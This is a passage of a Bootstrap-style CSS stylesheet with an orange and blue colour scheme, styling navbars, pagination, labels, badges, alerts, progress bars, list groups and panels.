            -webkit-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.1), 0 1px 0 rgba(255, 255, 255, 0.1);
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.1), 0 1px 0 rgba(255, 255, 255, 0.1);
            margin-top: 10px;
            margin-bottom: 10px;
        }

        @media (min-width: 768px) {
            .navbar-form .form-group {
                display: inline-block;
                margin-bottom: 0;
                vertical-align: middle;
            }

            .navbar-form .form-control {
                display: inline-block;
                width: auto;
                vertical-align: middle;
            }

            .navbar-form .form-control-static {
                display: inline-block;
            }

            .navbar-form .input-group {
                display: inline-table;
                vertical-align: middle;
            }

            .navbar-form .input-group .input-group-addon,
            .navbar-form .input-group .input-group-btn,
            .navbar-form .input-group .form-control {
                width: auto;
            }

            .navbar-form .input-group>.form-control {
                width: 100%;
            }

            .navbar-form .control-label {
                margin-bottom: 0;
                vertical-align: middle;
            }

            .navbar-form .radio,
            .navbar-form .checkbox {
                display: inline-block;
                margin-top: 0;
                margin-bottom: 0;
                vertical-align: middle;
            }

            .navbar-form .radio label,
            .navbar-form .checkbox label {
                padding-left: 0;
            }

            .navbar-form .radio input[type="radio"],
            .navbar-form .checkbox input[type="checkbox"] {
                position: relative;
                margin-left: 0;
            }

            .navbar-form .has-feedback .form-control-feedback {
                top: 0;
            }
        }

        @media (max-width: 767px) {
            .navbar-form .form-group {
                margin-bottom: 5px;
            }

            .navbar-form .form-group:last-child {
                margin-bottom: 0;
            }
        }

        @media (min-width: 768px) {
            .navbar-form {
                width: auto;
                padding-top: 0;
                padding-bottom: 0;
                margin-right: 0;
                margin-left: 0;
                border: 0;
                -webkit-box-shadow: none;
                box-shadow: none;
            }
        }

        .navbar-nav>li>.dropdown-menu {
            margin-top: 0;
            border-top-left-radius: 0;
            border-top-right-radius: 0;
        }

        .navbar-fixed-bottom .navbar-nav>li>.dropdown-menu {
            margin-bottom: 0;
            border-top-left-radius: 3px;
            border-top-right-radius: 3px;
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
        }

        .navbar-btn {
            margin-top: 10px;
            margin-bottom: 10px;
        }

        .navbar-btn.btn-sm {
            margin-top: 10px;
            margin-bottom: 10px;
        }

        .navbar-btn.btn-xs {
            margin-top: 14px;
            margin-bottom: 14px;
        }

        .navbar-text {
            margin-top: 15px;
            margin-bottom: 15px;
        }

        @media (min-width: 768px) {
            .navbar-text {
                float: left;
                margin-right: 15px;
                margin-left: 15px;
            }
        }

        @media (min-width: 768px) {
            .navbar-left {
                float: left !important;
                float: left;
            }

            .navbar-right {
                float: right !important;
                float: right;
                margin-right: -15px;
            }

            .navbar-right~.navbar-right {
                margin-right: 0;
            }
        }

        .navbar-default {
            background-color: #f8f8f8;
            border-color: #e7e7e7;
        }

        .navbar-default .navbar-brand {
            color: #777;
        }

        .navbar-default .navbar-brand:hover,
        .navbar-default .navbar-brand:focus {
            color: #5e5e5e;
            background-color: transparent;
        }

        .navbar-default .navbar-text {
            color: #777;
        }

        .navbar-default .navbar-nav>li>a {
            color: #777;
        }

        .navbar-default .navbar-nav>li>a:hover,
        .navbar-default .navbar-nav>li>a:focus {
            color: #333;
            background-color: transparent;
        }

        .navbar-default .navbar-nav>.active>a,
        .navbar-default .navbar-nav>.active>a:hover,
        .navbar-default .navbar-nav>.active>a:focus {
            color: #555;
            background-color: #e7e7e7;
        }

        .navbar-default .navbar-nav>.disabled>a,
        .navbar-default .navbar-nav>.disabled>a:hover,
        .navbar-default .navbar-nav>.disabled>a:focus {
            color: #ccc;
            background-color: transparent;
        }

        .navbar-default .navbar-nav>.open>a,
        .navbar-default .navbar-nav>.open>a:hover,
        .navbar-default .navbar-nav>.open>a:focus {
            color: #555;
            background-color: #e7e7e7;
        }

        @media (max-width: 767px) {
            .navbar-default .navbar-nav .open .dropdown-menu>li>a {
                color: #777;
            }

            .navbar-default .navbar-nav .open .dropdown-menu>li>a:hover,
            .navbar-default .navbar-nav .open .dropdown-menu>li>a:focus {
                color: #333;
                background-color: transparent;
            }

            .navbar-default .navbar-nav .open .dropdown-menu>.active>a,
            .navbar-default .navbar-nav .open .dropdown-menu>.active>a:hover,
            .navbar-default .navbar-nav .open .dropdown-menu>.active>a:focus {
                color: #555;
                background-color: #e7e7e7;
            }

            .navbar-default .navbar-nav .open .dropdown-menu>.disabled>a,
            .navbar-default .navbar-nav .open .dropdown-menu>.disabled>a:hover,
            .navbar-default .navbar-nav .open .dropdown-menu>.disabled>a:focus {
                color: #ccc;
                background-color: transparent;
            }
        }

        .navbar-default .navbar-toggle {
            border-color: #ddd;
        }

        .navbar-default .navbar-toggle:hover,
        .navbar-default .navbar-toggle:focus {
            background-color: #ddd;
        }

        .navbar-default .navbar-toggle .icon-bar {
            background-color: #888;
        }

        .navbar-default .navbar-collapse,
        .navbar-default .navbar-form {
            border-color: #e7e7e7;
        }

        .navbar-default .navbar-link {
            color: #777;
        }

        .navbar-default .navbar-link:hover {
            color: #333;
        }

        .navbar-default .btn-link {
            color: #777;
        }

        .navbar-default .btn-link:hover,
        .navbar-default .btn-link:focus {
            color: #333;
        }

        .navbar-default .btn-link[disabled]:hover,
        fieldset[disabled] .navbar-default .btn-link:hover,
        .navbar-default .btn-link[disabled]:focus,
        fieldset[disabled] .navbar-default .btn-link:focus {
            color: #ccc;
        }

        .navbar-inverse {
            background-color: #222;
            border-color: #080808;
        }

        .navbar-inverse .navbar-brand {
            color: #9d9d9d;
        }

        .navbar-inverse .navbar-brand:hover,
        .navbar-inverse .navbar-brand:focus {
            color: #fff;
            background-color: transparent;
        }

        .navbar-inverse .navbar-text {
            color: #9d9d9d;
        }

        .navbar-inverse .navbar-nav>li>a {
            color: #9d9d9d;
        }

        .navbar-inverse .navbar-nav>li>a:hover,
        .navbar-inverse .navbar-nav>li>a:focus {
            color: #fff;
            background-color: transparent;
        }

        .navbar-inverse .navbar-nav>.active>a,
        .navbar-inverse .navbar-nav>.active>a:hover,
        .navbar-inverse .navbar-nav>.active>a:focus {
            color: #fff;
            background-color: #080808;
        }

        .navbar-inverse .navbar-nav>.disabled>a,
        .navbar-inverse .navbar-nav>.disabled>a:hover,
        .navbar-inverse .navbar-nav>.disabled>a:focus {
            color: #444;
            background-color: transparent;
        }

        .navbar-inverse .navbar-nav>.open>a,
        .navbar-inverse .navbar-nav>.open>a:hover,
        .navbar-inverse .navbar-nav>.open>a:focus {
            color: #fff;
            background-color: #080808;
        }

        @media (max-width: 767px) {
            .navbar-inverse .navbar-nav .open .dropdown-menu>.dropdown-header {
                border-color: #080808;
            }

            .navbar-inverse .navbar-nav .open .dropdown-menu .divider {
                background-color: #080808;
            }

            .navbar-inverse .navbar-nav .open .dropdown-menu>li>a {
                color: #9d9d9d;
            }

            .navbar-inverse .navbar-nav .open .dropdown-menu>li>a:hover,
            .navbar-inverse .navbar-nav .open .dropdown-menu>li>a:focus {
                color: #fff;
                background-color: transparent;
            }

            .navbar-inverse .navbar-nav .open .dropdown-menu>.active>a,
            .navbar-inverse .navbar-nav .open .dropdown-menu>.active>a:hover,
            .navbar-inverse .navbar-nav .open .dropdown-menu>.active>a:focus {
                color: #fff;
                background-color: #080808;
            }

            .navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a,
            .navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a:hover,
            .navbar-inverse .navbar-nav .open .dropdown-menu>.disabled>a:focus {
                color: #444;
                background-color: transparent;
            }
        }

        .navbar-inverse .navbar-toggle {
            border-color: #333;
        }

        .navbar-inverse .navbar-toggle:hover,
        .navbar-inverse .navbar-toggle:focus {
            background-color: #333;
        }

        .navbar-inverse .navbar-toggle .icon-bar {
            background-color: #fff;
        }

        .navbar-inverse .navbar-collapse,
        .navbar-inverse .navbar-form {
            border-color: #101010;
        }

        .navbar-inverse .navbar-link {
            color: #9d9d9d;
        }

        .navbar-inverse .navbar-link:hover {
            color: #fff;
        }

        .navbar-inverse .btn-link {
            color: #9d9d9d;
        }

        .navbar-inverse .btn-link:hover,
        .navbar-inverse .btn-link:focus {
            color: #fff;
        }

        .navbar-inverse .btn-link[disabled]:hover,
        fieldset[disabled] .navbar-inverse .btn-link:hover,
        .navbar-inverse .btn-link[disabled]:focus,
        fieldset[disabled] .navbar-inverse .btn-link:focus {
            color: #444;
        }

        .breadcrumb {
            padding: 8px 15px;
            margin-bottom: 20px;
            list-style: none;
            background-color: #f5f5f5;
            border-radius: 3px;
        }

        .breadcrumb>li {
            display: inline-block;
        }

        .breadcrumb>li+li:before {
            padding: 0 5px;
            color: #ccc;
            content: "/\00a0";
        }

        .breadcrumb>.active {
            color: #777;
        }

        .pagination {
            display: inline-block;
            padding-left: 0;
            margin: 20px 0;
            border-radius: 3px;
        }

        .pagination>li {
            display: inline;
        }

        .pagination>li>a,
        .pagination>li>span {
            position: relative;
            float: left;
            padding: 4px 12px;
            margin-left: -1px;
            line-height: 1.42857143;
            color: #07b;
            text-decoration: none;
            background-color: #fff;
            border: 1px solid #ddd;
        }

        .pagination>li>a:hover,
        .pagination>li>span:hover,
        .pagination>li>a:focus,
        .pagination>li>span:focus {
            z-index: 2;
            color: #00466e;
            background-color: #eee;
            border-color: #ddd;
        }

        .pagination>li:first-child>a,
        .pagination>li:first-child>span {
            margin-left: 0;
            border-top-left-radius: 3px;
            border-bottom-left-radius: 3px;
        }

        .pagination>li:last-child>a,
        .pagination>li:last-child>span {
            border-top-right-radius: 3px;
            border-bottom-right-radius: 3px;
        }

        .pagination>.active>a,
        .pagination>.active>span,
        .pagination>.active>a:hover,
        .pagination>.active>span:hover,
        .pagination>.active>a:focus,
        .pagination>.active>span:focus {
            z-index: 3;
            color: #fff;
            cursor: default;
            background-color: #f80;
            border-color: #f80;
        }

        .pagination>.disabled>span,
        .pagination>.disabled>span:hover,
        .pagination>.disabled>span:focus,
        .pagination>.disabled>a,
        .pagination>.disabled>a:hover,
        .pagination>.disabled>a:focus {
            color: #777;
            cursor: not-allowed;
            background-color: #fff;
            border-color: #ddd;
        }

        .pagination-lg>li>a,
        .pagination-lg>li>span {
            padding: 10px 16px;
            font-size: 18px;
            line-height: 1.3333333;
        }

        .pagination-lg>li:first-child>a,
        .pagination-lg>li:first-child>span {
            border-top-left-radius: 3px;
            border-bottom-left-radius: 3px;
        }

        .pagination-lg>li:last-child>a,
        .pagination-lg>li:last-child>span {
            border-top-right-radius: 3px;
            border-bottom-right-radius: 3px;
        }

        .pagination-sm>li>a,
        .pagination-sm>li>span {
            padding: 5px 10px;
            font-size: 12px;
            line-height: 1.5;
        }

        .pagination-sm>li:first-child>a,
        .pagination-sm>li:first-child>span {
            border-top-left-radius: 3px;
            border-bottom-left-radius: 3px;
        }

        .pagination-sm>li:last-child>a,
        .pagination-sm>li:last-child>span {
            border-top-right-radius: 3px;
            border-bottom-right-radius: 3px;
        }

        .pager {
            padding-left: 0;
            margin: 20px 0;
            text-align: center;
            list-style: none;
        }

        .pager li {
            display: inline;
        }

        .pager li>a,
        .pager li>span {
            display: inline-block;
            padding: 5px 14px;
            background-color: #fff;
            border: 1px solid #ddd;
            border-radius: 15px;
        }

        .pager li>a:hover,
        .pager li>a:focus {
            text-decoration: none;
            background-color: #eee;
        }

        .pager .next>a,
        .pager .next>span {
            float: right;
        }

        .pager .previous>a,
        .pager .previous>span {
            float: left;
        }

        .pager .disabled>a,
        .pager .disabled>a:hover,
        .pager .disabled>a:focus,
        .pager .disabled>span {
            color: #777;
            cursor: not-allowed;
            background-color: #fff;
        }

        .label {
            display: inline;
            padding: 0.2em 0.6em 0.3em;
            font-size: 75%;
            font-weight: 700;
            line-height: 1;
            color: #fff;
            text-align: center;
            white-space: nowrap;
            vertical-align: baseline;
            border-radius: 0.25em;
        }

        a.label:hover,
        a.label:focus {
            color: #fff;
            text-decoration: none;
            cursor: pointer;
        }

        .label:empty {
            display: none;
        }

        .btn .label {
            position: relative;
            top: -1px;
        }

        .label-default {
            background-color: #666;
        }

        .label-primary {
            background-color: #f80;
        }

        .label-success {
            background-color: #008500;
        }

        .label-info {
            background-color: #3a87ad;
        }

        .label-warning {
            background-color: #f0ad4e;
        }

        .label-danger {
            background-color: #d9534f;
        }

        .badge {
            display: inline-block;
            min-width: 10px;
            padding: 3px 7px;
            font-size: 12px;
            font-weight: bold;
            line-height: 1;
            color: #fff;
            text-align: center;
            white-space: nowrap;
            vertical-align: middle;
            background-color: #aaa;
            border-radius: 10px;
        }

        .badge:empty {
            display: none;
        }

        .btn .badge {
            position: relative;
            top: -1px;
        }

        .btn-xs .badge,
        .btn-group-xs>.btn .badge {
            top: 0;
            padding: 1px 5px;
        }

        a.badge:hover,
        a.badge:focus {
            color: #fff;
            text-decoration: none;
            cursor: pointer;
        }

        .list-group-item.active>.badge,
        .nav-pills>.active>a>.badge {
            color: #07b;
            background-color: #fff;
        }

        .list-group-item>.badge {
            float: right;
        }

        .list-group-item>.badge+.badge {
            margin-right: 5px;
        }

        .nav-pills>li>a>.badge {
            margin-left: 3px;
        }

        .jumbotron {
            padding-top: 30px;
            padding-bottom: 30px;
            margin-bottom: 30px;
            color: inherit;
            background-color: #eee;
        }

        .jumbotron h1,
        .jumbotron .h1 {
            color: inherit;
        }

        .jumbotron p {
            margin-bottom: 15px;
            font-size: 21px;
            font-weight: 200;
        }

        .jumbotron>hr {
            border-top-color: #d5d5d5;
        }

        .container .jumbotron,
        .container-fluid .jumbotron {
            padding-right: 15px;
            padding-left: 15px;
            border-radius: 3px;
        }

        .jumbotron .container {
            max-width: 100%;
        }

        @media screen and (min-width: 768px) {
            .jumbotron {
                padding-top: 48px;
                padding-bottom: 48px;
            }

            .container .jumbotron,
            .container-fluid .jumbotron {
                padding-right: 60px;
                padding-left: 60px;
            }

            .jumbotron h1,
            .jumbotron .h1 {
                font-size: 63px;
            }
        }

        .thumbnail {
            display: block;
            padding: 4px;
            margin-bottom: 20px;
            line-height: 1.42857143;
            background-color: #fff;
            border: 1px solid #ddd;
            border-radius: 3px;
            -webkit-transition: border 0.2s ease-in-out;
            -o-transition: border 0.2s ease-in-out;
            transition: border 0.2s ease-in-out;
        }

        .thumbnail>img,
        .thumbnail a>img {
            margin-right: auto;
            margin-left: auto;
        }

        a.thumbnail:hover,
        a.thumbnail:focus,
        a.thumbnail.active {
            border-color: #07b;
        }

        .thumbnail .caption {
            padding: 9px;
            color: #333;
        }

        .alert {
            padding: 15px;
            margin-bottom: 20px;
            border: 1px solid transparent;
            border-radius: 3px;
        }

        .alert h4 {
            margin-top: 0;
            color: inherit;
        }

        .alert .alert-link {
            font-weight: bold;
        }

        .alert>p,
        .alert>ul {
            margin-bottom: 0;
        }

        .alert>p+p {
            margin-top: 5px;
        }

        .alert-dismissable,
        .alert-dismissible {
            padding-right: 35px;
        }

        .alert-dismissable .close,
        .alert-dismissible .close {
            position: relative;
            top: -2px;
            right: -21px;
            color: inherit;
        }

        .alert-success {
            color: #3c763d;
            background-color: #dff0d8;
            border-color: #d6e9c6;
        }

        .alert-success hr {
            border-top-color: #c9e2b3;
        }

        .alert-success .alert-link {
            color: #2b542c;
        }

        .alert-info {
            color: #396ca0;
            background-color: #d9edf7;
            border-color: #bce8f1;
        }

        .alert-info hr {
            border-top-color: #a6e1ec;
        }

        .alert-info .alert-link {
            color: #2c537a;
        }

        .alert-warning {
            color: #8a6d3b;
            background-color: #fcf8e3;
            border-color: #faebcc;
        }

        .alert-warning hr {
            border-top-color: #f7e1b5;
        }

        .alert-warning .alert-link {
            color: #66512c;
        }

        .alert-danger {
            color: #a94442;
            background-color: #f2dede;
            border-color: #ebccd1;
        }

        .alert-danger hr {
            border-top-color: #e4b9c0;
        }

        .alert-danger .alert-link {
            color: #843534;
        }

        @-webkit-keyframes progress-bar-stripes {
            from {
                background-position: 40px 0;
            }

            to {
                background-position: 0 0;
            }
        }

        @keyframes progress-bar-stripes {
            from {
                background-position: 40px 0;
            }

            to {
                background-position: 0 0;
            }
        }

        .progress {
            height: 20px;
            margin-bottom: 20px;
            overflow: hidden;
            background-color: #f5f5f5;
            border-radius: 3px;
            -webkit-box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
            box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
        }

        .progress-bar {
            float: left;
            width: 0%;
            height: 100%;
            font-size: 12px;
            line-height: 20px;
            color: #fff;
            text-align: center;
            background-color: #f80;
            -webkit-box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.15);
            box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.15);
            -webkit-transition: width 0.6s ease;
            -o-transition: width 0.6s ease;
            transition: width 0.6s ease;
        }

        .progress-striped .progress-bar,
        .progress-bar-striped {
            background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
            background-image: -o-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
            background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
            background-size: 40px 40px;
        }

        .progress.active .progress-bar,
        .progress-bar.active {
            -webkit-animation: progress-bar-stripes 2s linear infinite;
            -o-animation: progress-bar-stripes 2s linear infinite;
            animation: progress-bar-stripes 2s linear infinite;
        }

        .progress-bar-success {
            background-color: #008500;
        }

        .progress-striped .progress-bar-success {
            background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
            background-image: -o-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
            background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
        }

        .progress-bar-info {
            background-color: #5bc0de;
        }

        .progress-striped .progress-bar-info {
            background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
            background-image: -o-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
            background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
        }

        .progress-bar-warning {
            background-color: #f0ad4e;
        }

        .progress-striped .progress-bar-warning {
            background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
            background-image: -o-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
            background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
        }

        .progress-bar-danger {
            background-color: #d9534f;
        }

        .progress-striped .progress-bar-danger {
            background-image: -webkit-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
            background-image: -o-linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
            background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
        }

        .media {
            margin-top: 15px;
        }

        .media:first-child {
            margin-top: 0;
        }

        .media,
        .media-body {
            overflow: hidden;
            zoom: 1;
        }

        .media-body {
            width: 10000px;
        }

        .media-object {
            display: block;
        }

        .media-object.img-thumbnail {
            max-width: none;
        }

        .media-right,
        .media>.pull-right {
            padding-left: 10px;
        }

        .media-left,
        .media>.pull-left {
            padding-right: 10px;
        }

        .media-left,
        .media-right,
        .media-body {
            display: table-cell;
            vertical-align: top;
        }

        .media-middle {
            vertical-align: middle;
        }

        .media-bottom {
            vertical-align: bottom;
        }

        .media-heading {
            margin-top: 0;
            margin-bottom: 5px;
        }

        .media-list {
            padding-left: 0;
            list-style: none;
        }

        .list-group {
            padding-left: 0;
            margin-bottom: 20px;
        }

        .list-group-item {
            position: relative;
            display: block;
            padding: 10px 15px;
            margin-bottom: -1px;
            background-color: #fff;
            border: 1px solid #ddd;
        }

        .list-group-item:first-child {
            border-top-left-radius: 3px;
            border-top-right-radius: 3px;
        }

        .list-group-item:last-child {
            margin-bottom: 0;
            border-bottom-right-radius: 3px;
            border-bottom-left-radius: 3px;
        }

        .list-group-item.disabled,
        .list-group-item.disabled:hover,
        .list-group-item.disabled:focus {
            color: #777;
            cursor: not-allowed;
            background-color: #eee;
        }

        .list-group-item.disabled .list-group-item-heading,
        .list-group-item.disabled:hover .list-group-item-heading,
        .list-group-item.disabled:focus .list-group-item-heading {
            color: inherit;
        }

        .list-group-item.disabled .list-group-item-text,
        .list-group-item.disabled:hover .list-group-item-text,
        .list-group-item.disabled:focus .list-group-item-text {
            color: #777;
        }

        .list-group-item.active,
        .list-group-item.active:hover,
        .list-group-item.active:focus {
            z-index: 2;
            color: #fff;
            background-color: #f80;
            border-color: #f80;
        }

        .list-group-item.active .list-group-item-heading,
        .list-group-item.active:hover .list-group-item-heading,
        .list-group-item.active:focus .list-group-item-heading,
        .list-group-item.active .list-group-item-heading>small,
        .list-group-item.active:hover .list-group-item-heading>small,
        .list-group-item.active:focus .list-group-item-heading>small,
        .list-group-item.active .list-group-item-heading>.small,
        .list-group-item.active:hover .list-group-item-heading>.small,
        .list-group-item.active:focus .list-group-item-heading>.small {
            color: inherit;
        }

        .list-group-item.active .list-group-item-text,
        .list-group-item.active:hover .list-group-item-text,
        .list-group-item.active:focus .list-group-item-text {
            color: #ffe7cc;
        }

        a.list-group-item,
        button.list-group-item {
            color: #555;
        }

        a.list-group-item .list-group-item-heading,
        button.list-group-item .list-group-item-heading {
            color: #333;
        }

        a.list-group-item:hover,
        button.list-group-item:hover,
        a.list-group-item:focus,
        button.list-group-item:focus {
            color: #555;
            text-decoration: none;
            background-color: #f5f5f5;
        }

        button.list-group-item {
            width: 100%;
            text-align: left;
        }

        .list-group-item-success {
            color: #3c763d;
            background-color: #dff0d8;
        }

        .list-group-item-info {
            color: #31708f;
            background-color: #d9edf7;
        }

        .list-group-item-warning {
            color: #8a6d3b;
            background-color: #fcf8e3;
        }

        .list-group-item-danger {
            color: #a94442;
            background-color: #f2dede;
        }

        .list-group-item-heading {
            margin-top: 0;
            margin-bottom: 5px;
        }

        .list-group-item-text {
            margin-bottom: 0;
            line-height: 1.3;
        }

        .panel {
            margin-bottom: 20px;
            background-color: #fff;
            border: 1px solid transparent;
            border-radius: 3px;
            -webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);
            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);
        }

        .panel-body {
            padding: 15px;
        }

        .panel-heading {
            padding: 10px 15px;
            border-bottom: 1px solid transparent;
            border-top-left-radius: 2px;
            border-top-right-radius: 2px;
        }

        .panel-heading>.dropdown .dropdown-toggle {
            color: inherit;
        }

        .panel-title {
            margin-top: 0;
            margin-bottom: 0;
            font-size: 16px;
            color: inherit;
        }

        .panel-title>a,
        .panel-title>small,
        .panel-title>.small,
        .panel-title>small>a,
        .panel-title>.small>a {
            color: inherit;
        }

        .panel-footer {
            padding: 10px 15px;
            background-color: #f5f5f5;
            border-top: 1px solid #ddd;
            border-bottom-right-radius: 2px;
            border-bottom-left-radius: 2px;
        }

        .panel>.list-group,
        .panel>.panel-collapse>.list-group {
            margin-bottom: 0;
        }

        .panel>.list-group .list-group-item,
        .panel>.panel-collapse>.list-group .list-group-item {
            border-width: 1px 0;
            border-radius: 0;
        }

        .panel>.list-group:first-child .list-group-item:first-child,
        .panel>.panel-collapse>.list-group:first-child .list-group-item:first-child {
            border-top: 0;
            border-top-left-radius: 2px;
            border-top-right-radius: 2px;
        }

        .panel>.list-group:last-child .list-group-item:last-child,
        .panel>.panel-collapse>.list-group:last-child .list-group-item:last-child {
            border-bottom: 0;
            border-bottom-right-radius: 2px;
            border-bottom-left-radius: 2px;
        }

        .panel>.panel-heading+.panel-collapse>.list-group .list-group-item:first-child {
            border-top-left-radius: 0;
            border-top-right-radius: 0;
        }

        .panel-heading+.list-group .list-group-item:first-child {
            border-top-width: 0;
        }

        .list-group+.panel-footer {
            border-top-width: 0;
        }

        .panel>.table,
        .panel>.table-responsive>.table,
        .panel>.panel-collapse>.table {
            margin-bottom: 0;
        }

        .panel>.table caption,
        .panel>.table-responsive>.table caption,
        .panel>.panel-collapse>.table caption {
            padding-right: 15px;
            padding-left: 15px;
        }

        .panel>.table:first-child,
        .panel>.table-responsive:first-child>.table:first-child {
            border-top-left-radius: 2px;
            border-top-right-radius: 2px;
        }

        .panel>.table:first-child>thead:first-child>tr:first-child,
        .panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child,
        .panel>.table:first-child>tbody:first-child>tr:first-child,
        .panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child {
            border-top-left-radius: 2px;
            border-top-right-radius: 2px;
        }

        .panel>.table:first-child>thead:first-child>tr:first-child td:first-child,
        .panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child td:first-child,
        .panel>.table:first-child>tbody:first-child>tr:first-child td:first-child,
        .panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child td:first-child,
        .panel>.table:first-child>thead:first-child>tr:first-child th:first-child,
        .panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child th:first-child,
        .panel>.table:first-child>tbody:first-child>tr:first-child th:first-child,
        .panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child th:first-child {
            border-top-left-radius: 2px;
        }

        .panel>.table:first-child>thead:first-child>tr:first-child td:last-child,
        .panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child td:last-child,
        .panel>.table:first-child>tbody:first-child>tr:first-child td:last-child,
        .panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child td:last-child,
        .panel>.table:first-child>thead:first-child>tr:first-child th:last-child,
        .panel>.table-responsive:first-child>.table:first-child>thead:first-child>tr:first-child th:last-child,
        .panel>.table:first-child>tbody:first-child>tr:first-child th:last-child,
        .panel>.table-responsive:first-child>.table:first-child>tbody:first-child>tr:first-child th:last-child {
            border-top-right-radius: 2px;
        }

        .panel>.table:last-child,
        .panel>.table-responsive:last-child>.table:last-child {
            border-bottom-right-radius: 2px;
            border-bottom-left-radius: 2px;
        }

        .panel>.table:last-child>tbody:last-child>tr:last-child,
        .panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child,
        .panel>.table:last-child>tfoot:last-child>tr:last-child,
        .panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child {
            border-bottom-right-radius: 2px;
            border-bottom-left-radius: 2px;
        }

        .panel>.table:last-child>tbody:last-child>tr:last-child td:first-child,
        .panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child td:first-child,
        .panel>.table:last-child>tfoot:last-child>tr:last-child td:first-child,
        .panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child td:first-child,
        .panel>.table:last-child>tbody:last-child>tr:last-child th:first-child,
        .panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child th:first-child,
        .panel>.table:last-child>tfoot:last-child>tr:last-child th:first-child,
        .panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child th:first-child {
            border-bottom-left-radius: 2px;
        }

        .panel>.table:last-child>tbody:last-child>tr:last-child td:last-child,
        .panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child td:last-child,
        .panel>.table:last-child>tfoot:last-child>tr:last-child td:last-child,
        .panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child td:last-child,
        .panel>.table:last-child>tbody:last-child>tr:last-child th:last-child,
        .panel>.table-responsive:last-child>.table:last-child>tbody:last-child>tr:last-child th:last-child,
        .panel>.table:last-child>tfoot:last-child>tr:last-child th:last-child,
        .panel>.table-responsive:last-child>.table:last-child>tfoot:last-child>tr:last-child th:last-child {
            border-bottom-right-radius: 2px;
        }

        .panel>.panel-body+.table,
        .panel>.panel-body+.table-responsive,
        .panel>.table+.panel-body,
        .panel>.table-responsive+.panel-body {
            border-top: 1px solid #ddd;
        }

        .panel>.table>tbody:first-child>tr:first-child th,
        .panel>.table>tbody:first-child>tr:first-child td {
            border-top: 0;
        }

        .panel>.table-bordered,
        .panel>.table-responsive>.table-bordered {
            border: 0;
        }

        .panel>.table-bordered>thead>tr>th:first-child,
        .panel>.table-responsive>.table-bordered>thead>tr>th:first-child,
